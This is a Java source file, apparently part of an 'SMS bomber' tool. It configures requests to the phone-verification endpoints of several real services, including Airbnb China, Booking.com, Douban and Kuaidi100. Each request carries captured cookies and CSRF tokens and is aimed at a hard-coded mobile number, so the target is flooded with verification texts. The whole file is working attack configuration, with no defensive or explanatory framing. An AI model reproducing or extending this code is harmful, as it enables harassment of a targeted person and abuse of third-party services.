package com.lzj.smsboom.utils;

import com.lzj.smsboom.bean.ProxyTargetEntry;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;

import javax.annotation.PostConstruct;
import java.util.*;

/**
 * @Description:
 * @Author: LZJ
 * @Date： 2019/11/16 12:20
 */

public class SmsBoomURL {

    public static volatile List<ProxyTargetEntry> proxyTargetEntryList = new ArrayList<>();

    private final static String tagetMobile = "18362939129";

    @PostConstruct
    public void initProxyTarget(){
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_JOB5156(),URL_JOB5156, HttpMethod.GET));
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_1BRC(),URL_1BRC, HttpMethod.POST));
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_AIRBNB(),URL_AIRBNB, HttpMethod.POST));
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_BOOKING(),URL_BOOKING, HttpMethod.POST));
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_51TALK(),URL_51TALK, HttpMethod.GET));
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_DOUBAN(),URL_DOUBAN, HttpMethod.POST));
        proxyTargetEntryList.add(new ProxyTargetEntry(httpEntity_KUAIDI100(),URL_KUAIDI100, HttpMethod.POST));

    }

    /**
     * 智通人才网
     */
    public final static String URL_JOB5156 = String.format("http://www.job5156.com/api/verify/dynamic/login?t=%s&mobile={1}&isCheckAccount=%s",System.currentTimeMillis(),false);
    public static HttpEntity httpEntity_JOB5156(){
        Map<Object, Object> body = new LinkedMultiValueMap();
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("AppType","pc");
        requestHeaders.set("posTypeNewFlag","true");
        requestHeaders.set(HttpHeaders.HOST,"www.job5156.com");
        requestHeaders.set(HttpHeaders.REFERER,"http://www.job5156.com/register/per");
        requestHeaders.set(HttpHeaders.COOKIE,"uvcookie=b06c6801825d4cd0b37b2bcfe8bb4961; jscookie=680178c12d4105ca6ecbe5d55e9a636a; JSESSIONID=1DDE5954F28DA674B6CE4DDB680124C8; d87a445a1f22d65370f406844dc1e56a=d2e4a87828ad1c5a2806089646237c65; 8aa932cc6211ccbe21af0c963b3e3415=d1bee0e644ca5feece7468a5648b4005; search_keyword=undefined; Hm_lvt_6cc160b93b871a4884a8cd8dc4addcd3=1573825738; Hm_lpvt_6cc160b93b871a4884a8cd8dc4addcd3=1573825738; orginflag=1; accessflag=1; csrfToken=57sBHZtRE_WmXxRQBEaPdUIz; uuid=78812a58edbc3e498cf80109210d34f7; uuid.sig=b3EHLQ6pXT-GkHNHLPjcfAjJnV8TmXSU3R8T17zbpcg; cf99fb1bff6494fb3dc3e887223abd55=02c08c87497e9f6d06a8062e9e0be8d2; pvcount=\"fromUrl=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3D44DRkpWczxPfkZ4tX6YxCHMLXT9K3BjWSwnxjUNZEz-4FRhaVIlsjkFYaUzgRl_h-dbxeYp1G-jqmSpLwUXQe_%26wd%3D%26eqid%3De191ee64000bc67a000000065dceacba~jstateId=0364bfd910b779d78b8b24041a2a9f00~targetUrl=http%3A%2F%2Fwww.job5156.com%2Fregister%2Fper~fromSourceType=0");
        return new HttpEntity(body, requestHeaders);
    }

    /**
     * 一表人才
     */
    public static final String URL_1BRC = "https://webapp.1brc.cn/apis/api/v1/user/validphone/login";
    public static HttpEntity httpEntity_1BRC(){
        Map<Object, Object> body = new LinkedMultiValueMap();
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("source","web");
        requestHeaders.set("v","1.25.3");
        requestHeaders.set(HttpHeaders.ALLOW,"POST, OPTIONS");
        requestHeaders.set(HttpHeaders.ORIGIN,"https://webapp.1brc.cn");
        requestHeaders.set(HttpHeaders.REFERER,"https://webapp.1brc.cn/login");
        requestHeaders.set(HttpHeaders.COOKIE,"Hm_lvt_33eca2d47f72aece368de02381f1620b=1573881310; Hm_lpvt_33eca2d47f72aece368de02381f1620b=1573881310; Hm_lvt_8382ba0c8cbfc5eba54ce6a81cb6ba5e=1573881317; Hm_lpvt_8382ba0c8cbfc5eba54ce6a81cb6ba5e=1573881317");

        body.put("username", Arrays.asList(tagetMobile));
        return new HttpEntity(body, requestHeaders);
    }

    /**
     * 爱彼迎
     */
    public static final String URL_AIRBNB = "https://www.airbnb.cn/api/v2/phone_one_time_passwords?currency=CNY&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=zh";
    public static HttpEntity httpEntity_AIRBNB(){
        Map<Object, Object> body = new HashMap<>();
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("x-csrf-token","V4$.airbnb.cn$RwDIiMkMK1M$JcMuDL9WbnvPjiXl3l8irGIxSLL8N18b_07gDo5OyKg=");
        requestHeaders.set("x-csrf-without-token","1");
        requestHeaders.set(HttpHeaders.ORIGIN,"https://www.airbnb.cn");
        requestHeaders.set(HttpHeaders.REFERER,"https://www.airbnb.cn/?af=15514848&c=.pi12.pkqihoo_cpt_src_p1_daohangmingzhan");
        requestHeaders.set(HttpHeaders.COOKIE,"bev=1573882982_OTIyMjE2NjYyMTYy; cdn_exp_3cc08829fdee8c05a=control; jitney_client_session_id=13c643ac-d765-4556-a3e9-64110b05ae57; jitney_client_session_created_at=1573882982; affiliate=15514848; campaign=.pi12.pkqihoo_cpt_src_p1_daohangmingzhan; _user_attributes=%7B%22curr%22%3A%22CNY%22%2C%22guest_exchange%22%3A7.016105%2C%22device_profiling_session_id%22%3A%221573882982--60c5d65a758230d2fae52059%22%2C%22giftcard_profiling_session_id%22%3A%221573882982--3632717e34696e7292c9659e%22%2C%22reservation_profiling_session_id%22%3A%221573882982--5d94ac95d70fd25fcfbd975d%22%7D; flags=0; _airbed_session_id=93ebf2e6ff9f59a6119c6068d3ff306b; sdid=; __xsptplusUT_840=1; _pykey_=6981145b-5baf-567b-93e7-359fb6bbf939; __xsptplus840=840.1.1573882985.1573882985.1%233%7Chao.360.cn%7C%7C%7C%7C%23%23mzQ3Zyz1MSIXHC_fLL_0CmB8wIC3Cfol%23; ag_fid=uLpEQ7mIzyhhME2F; __ag_cm_=1; auth_jitney_session_id=7e3677f0-c6ec-44c8-8a0e-8472037aace9; affiliate_referral_at=1573882986; last_aacb=%7B%22af%22%3A%2215514848%22%2C%22c%22%3A%22.pi12.pkqihoo_cpt_src_p1_daohangmingzhan%22%2C%22timestamp%22%3A1573882986%7D; jitney_client_session_updated_at=1573882986; _csrf_token=V4%24.airbnb.cn%24RwDIiMkMK1M%24JcMuDL9WbnvPjiXl3l8irGIxSLL8N18b_07gDo5OyKg%3D; geetest_data=%7B%22success%22%3A1%2C%22gt%22%3A%22842cc17081653d0e7cf4bde73f80e4a9%22%2C%22challenge%22%3A%22a2ddeab87e0800204ea8a661dad2d516%22%2C%22new_captcha%22%3Atrue%7D; cbkp=3");
        requestHeaders.setContentType(MediaType.APPLICATION_JSON);
        body.put("phoneNumber", "86CN"+tagetMobile);
        body.put("workFlow", "LOGIN");
        return new HttpEntity(body, requestHeaders);
    }

    public static final String URL_51TALK = String.format("https://www.51talk.com/SmsVerification/getMobileCode?callback=jQuery32108459563427022112_%s&mobile={1}&authCode=&_=%s",System.currentTimeMillis(),System.currentTimeMillis());
    public static HttpEntity httpEntity_51TALK(){
        Map<Object, Object> body = new HashMap<>();
        HttpHeaders requestHeaders = new HttpHeaders();
        return new HttpEntity(body, requestHeaders);
    }

    public static final String URL_DOUBAN = "https://accounts.douban.com/j/mobile/login/request_phone_code";
    public static HttpEntity httpEntity_DOUBAN(){
        Map<Object, Object> body = new LinkedMultiValueMap();
        HttpHeaders requestHeaders = new HttpHeaders();
        //requestHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        body.put("ck", Arrays.asList(""));
        body.put("area_code", Arrays.asList("+86"));
        body.put("number", Arrays.asList(tagetMobile));
        return new HttpEntity(body, requestHeaders);
    }

    public static final String URL_KUAIDI100 = "https://sso.kuaidi100.com/sso/smssend.do";
    public static HttpEntity httpEntity_KUAIDI100(){
        Map<Object, Object> body = new LinkedMultiValueMap();
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set(HttpHeaders.HOST,"sso.kuaidi100.com");
        requestHeaders.set(HttpHeaders.ORIGIN,"https://sso.kuaidi100.com");
        requestHeaders.set(HttpHeaders.REFERER,"https://sso.kuaidi100.com/sso/authorize.do");
        requestHeaders.set(HttpHeaders.COOKIE,"Hm_lvt_22ea01af58ba2be0fec7c11b25e88e6c=1573889360; SSOID=SSOF095266A84F7D4444D3D49BED98D17E7; Hm_lpvt_22ea01af58ba2be0fec7c11b25e88e6c=1573889376; logintype=phone");
        requestHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
        body.put("name", Arrays.asList(tagetMobile));
        return new HttpEntity(body, requestHeaders);
    }

    public static final String URL_BOOKING = "https://account.booking.com/account/phone/request-verification";
    public static HttpEntity httpEntity_BOOKING(){
        Map<Object, Object> body = new HashMap<>();
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set(HttpHeaders.HOST,"account.booking.com");
        requestHeaders.set(HttpHeaders.ORIGIN,"https://account.booking.com");
        requestHeaders.set(HttpHeaders.REFERER,"https://account.booking.com/register?op_token=EgVvYXV0aCKEAwoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qowJVdGNCLS1NZWpZdVVST3dkU2Z5MmRyVnlWZGtnc1BHVGRyWkxDQS16bWlPbGI1ZUJRc1VmbjBrY0RXN0NYejBtc25lYWFqR1ZldWFNdWkxR2dsY296cG55eWYtTS0xVXJmVlI5RkJkUi03WlhrT3NCejYxYWpwb0NiTUp1Q1htNlNoVmhBNVYwTnZkamx1RVl1SVhBZzVWUktpYmNoUHoweTdidWdVdGNZS2QzVmxiMGZOR09ab3hFbjNxNHJGUEdmSXhkV0pDc1Vrd1BxZmlmLUdrTEd1UkxzbHRPVWYwVzVSR3BqWVBSWkR3eVE5c09NRDF0WVJ1a3VqZzRvdFRGaklYSWpKSE5SekdWSUNNampyOERUODBxUm83dy01UTI0Uk1CBGNvZGUqDgiEnVQ6AEIAWN6fvu4F");
        requestHeaders.set(HttpHeaders.COOKIE,"cors_js=1; BJS=-; zz_cook_tms_seg1=2; utag_main=v_id:016e72c9f939001a03de179b92a503073003406b00bd0$_sn:1$_ss:1$_st:1573885669498$ses_id:1573883869498%3Bexp-session$_pn:1%3Bexp-session$4split:1$4split2:0; zz_cook_tms_em=1; _ga=GA1.2.2109373954.1573883870; _gid=GA1.2.769001229.1573883870; zz_cook_tms_seg3=6; bkng=11UmFuZG9tSVYkc2RlIyh9Yaa29%2F3xUOLbnmKTRaewPBth6bzMA3x4c7Fx8i9IKULztgZAK%2BGQFypDSfynqQ0VkfUvsHN2Lg90H%2B4Dufy%2FOE%2FEmR0LWdrhxAYdS%2BLLllZ3YWAxq6re0MhufDbLDcqR98%2FvmLALqe8Wrd5zflSm11KEPmu1ZlvcU8JsopLX4auEmurts80%2BtH4%3D; _pxhd=d13d053c663355c497b5b3e16ad61fb2ee379760867adff0621866e36511b72f:05b2c6c1-0836-11ea-85e4-55d57cf12072; bkng_ap_lang=zh-cn; bkng_ap_sso_session=e30; bkng_sso_session=e30; lastSeen=1573883872324; bkng_ap=U2FsdGVkX19SwlRLLcXJl0ZEvxBJ%2BV1o%2FYO%2Bu5nNPQZWiR7p66NL%2F%2B57YwOZ%2FHhTPfLEGp3H%2BOIC%0ALbuv32b9Wg%3D%3D%0A; _pxvid=05b2c6c1-0836-11ea-85e4-55d57cf12072; __pxvid=0b413b44-0836-11ea-9214-0242ac110003; _px3=d6b0cf18b0942eade655a7db2e8255a169ef8be85ac8f745f8cedde18dae2b44:RKENZlw/psOeaPehWhh5V4H3vk/QmvpjgNv6AmpZUqfSY8FZcvKdQN/ezcGwfcZ05mt0zU/iG0psBVaZ/PYMEw==:1000:SMqT/CmmfUgFU3asS5hXxNFaDa9iz1o/qxg57eSNG5qaJC417r7x6a4tzGVio0fLcD9kvI7UAbgGnjUYoBX2MDfjdFbJozXDs28Qh2rs3azGBCK6OA7zbVpk02AwzwWWP0yB5MGsssidpiy30VlJ2uDi5B+1GIzCJ624c70UprE=; _pxde=477c3f6fbb1888fde6a80f54867f44be6ba3cb3c0b8e9212d00bf3345e81e52a:eyJ0aW1lc3RhbXAiOjE1NzM4ODM5Mjc2MDMsImZfa2IiOjAsImlwY19pZCI6W119");
        requestHeaders.setContentType(MediaType.APPLICATION_JSON);
        body.put("op_token", "EgVvYXV0aCKEAwoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qowJVdGNCLS1NZWpZdVVST3dkU2Z5MmRyVnlWZGtnc1BHVGRyWkxDQS16bWlPbGI1ZUJRc1VmbjBrY0RXN0NYejBtc25lYWFqR1ZldWFNdWkxR2dsY296cG55eWYtTS0xVXJmVlI5RkJkUi03WlhrT3NCejYxYWpwb0NiTUp1Q1htNlNoVmhBNVYwTnZkamx1RVl1SVhBZzVWUktpYmNoUHoweTdidWdVdGNZS2QzVmxiMGZOR09ab3hFbjNxNHJGUEdmSXhkV0pDc1Vrd1BxZmlmLUdrTEd1UkxzbHRPVWYwVzVSR3BqWVBSWkR3eVE5c09NRDF0WVJ1a3VqZzRvdFRGaklYSWpKSE5SekdWSUNNampyOERUODBxUm83dy01UTI0Uk1CBGNvZGUqDgiEnVQ6AEIAWN6fvu4F");
        body.put("phone", "+86"+tagetMobile);
        body.put("check_account", "1");
        return new HttpEntity(body, requestHeaders);
    }

}
